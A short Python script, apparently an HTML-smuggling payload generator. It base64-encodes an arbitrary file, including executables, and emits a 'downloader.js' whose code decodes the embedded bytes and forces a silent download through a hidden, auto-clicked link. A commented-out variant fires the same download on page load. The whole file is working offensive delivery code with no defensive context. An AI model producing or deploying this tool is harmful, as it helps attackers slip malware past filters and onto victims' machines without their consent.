import base64
import os
import sys


def detect_mime(ext):
    if ext == '.doc':
        return 'application/msword'
    elif ext == '.jpg' or ext == '.jpeg':
        return 'image/jpeg'
    elif ext == '.pdf':
        return 'application/pdf'
    elif ext == '.png':
        return 'image/png'
    else: # .bin, .exe, etc...
        return 'application/octet-stream'


def write_js(payload_b64, mime, filename):
#     payload = """
# window.onload = () => {{
#     const b64data = '{}';
#     const decoded = atob(b64data);
#     const bytes = new Uint8Array(decoded.length);
#     for (let i = 0; i < decoded.length; i++) {{
#         bytes[i] = decoded.charCodeAt(i);
#     }}

#     const blob = new Blob([bytes.buffer], {{ type: '{}' }});
#     const url = URL.createObjectURL(blob);

#     // Create a temporary download link.
#     const a = document.createElement('a');
#     a.style = 'display:none';
#     a.href = url;
#     a.download = '{}';
#     document.body.appendChild(a);
#     a.click();

#     // Cleanup
#     document.body.removeChild(a);
#     URL.revokeObjectURL(url);
# }}
# """.format(payload_b64, mime, filename)
    
    payload = """
((b64data, mime, filename) => {{
    const decoded = atob(b64data);
    const bytes = new Uint8Array(decoded.length);
    for (let i = 0; i < decoded.length; i++) {{
        bytes[i] = decoded.charCodeAt(i);
    }}

    const blob = new Blob([bytes.buffer], {{ type: mime }});
    const url = URL.createObjectURL(blob);

    // Create a temporary download link.
    const a = document.createElement('a');
    a.style = 'display:none';
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();

    // Cleanup
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}})('{}', '{}', '{}');
""".format(payload_b64, mime, filename)
    
    with open('downloader.js', 'w') as f:
        f.write(payload)


def main():
    if len(sys.argv) != 2:
        print("Usage: python3 generator.py <FILE>")
        return

    payload_path = sys.argv[1]
    payload_filename = os.path.basename(payload_path)
    payload_ext = os.path.splitext(payload_path)[1]

    mime = detect_mime(payload_ext)

    try:
        with open(payload_path, 'rb') as f:
            encoded = base64.b64encode(f.read())
        write_js(encoded.decode('utf-8'), mime, payload_filename)
    except FileNotFoundError as e:
        print(e)


if __name__ == '__main__':
    main()